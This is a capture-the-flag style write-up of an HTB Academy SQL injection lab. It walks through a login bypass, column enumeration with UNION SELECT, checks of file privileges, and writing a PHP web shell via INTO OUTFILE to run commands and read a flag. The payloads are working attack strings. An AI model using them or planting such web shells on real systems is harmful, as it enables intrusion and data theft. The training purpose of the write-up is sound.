# SQL Injection Fundamentals Skills Assessment
1. [Description](https://github.com/zyunrong/Writeups/blob/main/HTB%20Academy/SQL%20Injection%20Fundamentals.md#description)
2. [Walkthrough](https://github.com/zyunrong/Writeups/blob/main/HTB%20Academy/SQL%20Injection%20Fundamentals.md#walkthrough)

## Description
```
The company Inlanefreight has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.

Question:
Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

Hint:
Try to read files you know to find a location you can write to.
```
## Walkthrough
Upon loading the target, we are greeted with a login page with 2 fields, ```Username``` and ```Password```
</br>
I first try a several payloads to see if SQL Injection is possible in the ```Username``` field such that I am able to login and gain access without proper login credentials

<img width="1002" height="703" alt="image" src="https://github.com/user-attachments/assets/f31eef37-e74e-455d-8379-47d8a6e33a9b" />

After testing, I found that ```' OR '1'='1'#``` as a payload is sufficient to bypass the login and gain access.
</br>
After gaining access, there is a dashboard with a table showing payroll information and a search bar

<img width="1001" height="311" alt="image" src="https://github.com/user-attachments/assets/e8a3d42e-ea6d-4fda-b75f-57fa50e6a63f" />

The search input might be directly used in a SQL query to filter information to display on the table, as such it might be susceptible to SQL Injection
</br>
To test this out, I used a SQL UNION injection payload, specifically ```' UNION SELECT 1,2,3#``` as input to see if there is any error or output added to the table.</br>

An error is displayed, ```The used SELECT statements have a different number of columns```
</br>
This suggests that the search bar is susceptible to SQL Injection and that more testing has to be done to determine the number of columns the table has

<img width="999" height="232" alt="image" src="https://github.com/user-attachments/assets/d378e97d-2751-4cd7-b960-396943a965b0" />

To determine the number of columns, I repeat the payload above but increasing the number of columns each time until the output is displayed in the table
</br>

Finally, the payload ```' UNION SELECT 1,2,3,4,5# ``` causes the table to be updated with the output.</br>
Looking at the table and our payload, we know that the table has ```5``` columns, but only column ```2, 3, 4, 5``` are shown, hence any command execution has to be placed in those columns for the output to be displayed
<img width="1000" height="356" alt="Screenshot 2025-07-15 002707" src="https://github.com/user-attachments/assets/c5c6281b-6374-4856-bfb2-46703dbbbab3" />

First, we can use ```' UNION SELECT 1, user(), 3, 4, 5#``` to find out that the current user is root@localhost
<img width="998" height="354" alt="image" src="https://github.com/user-attachments/assets/30e6ef7a-b3b3-4826-83d3-53a473215478" />

Next, using ```' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"```, we can see the privileges granted to our user. The most important to us is the ```FILE```, which allows us to read and write files
<img width="1916" height="739" alt="image" src="https://github.com/user-attachments/assets/f9aac649-92a1-4e5c-8ac2-58a9a9f9d4f4" />

The output of ```' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"#``` is blank, which suggests that there are no restrictions to the ability to read/write files
<img width="1003" height="363" alt="image" src="https://github.com/user-attachments/assets/4308ae82-d148-40a2-b933-93d4c6550673" />

We are going to use the payload ```' union select 1,'<?php system($_REQUEST[0]); ?>', 3, 4, 5 into outfile '/var/www/html/shell.php'#``` to write a payload to a file on the web server which would allow us to execute commands through querying shell.php
<img width="999" height="229" alt="image" src="https://github.com/user-attachments/assets/9f8fb5fe-55e6-45ce-9d36-0cadb4cba8f1" />
However, there is an error as the user does not have permission to write to the location specified. Taking a look at the current URL, I instead try to write to ```/var/www/html/dashboard/``` instead with ```' union select 1,'<?php system($_REQUEST[0]); ?>', 3, 4, 5 into outfile '/var/www/html/dashboard/shell.php'#```
</br>
<img width="377" height="28" alt="image" src="https://github.com/user-attachments/assets/04d4cb0f-88e2-4572-865f-eaec5643d951" />

As writing to ```/var/www/html/dashboard/``` is successful, we can now execute system commands by specifying our command in the query for ```0```. As we know that the flag we need to find is in the / root directory, we first execute ```ls /``` to know the contents of the root directory by specifying it in the URL as such ```/dashboard/shell.php?0=ls /```
<img width="1000" height="102" alt="image" src="https://github.com/user-attachments/assets/aad98875-095d-4fd7-aa57-07b2580996cb" />

We see that the file name of the flag is ```flag_cae1dadcd174.txt``` and hence we need to run ```cat /flag_cae1dadcd174.txt``` to read the content of the flag by specifying in the URL again ```/dashboard/shell.php?0=cat /flag_cae1dadcd174.txt```

<img width="998" height="113" alt="Screenshot 2025-07-15 010343" src="https://github.com/user-attachments/assets/c5718479-9dd6-4164-b134-6c74a394f127" />

The contents of the flag can be seen inbetween the ```1``` and ```3``` as per the payload written into the file.


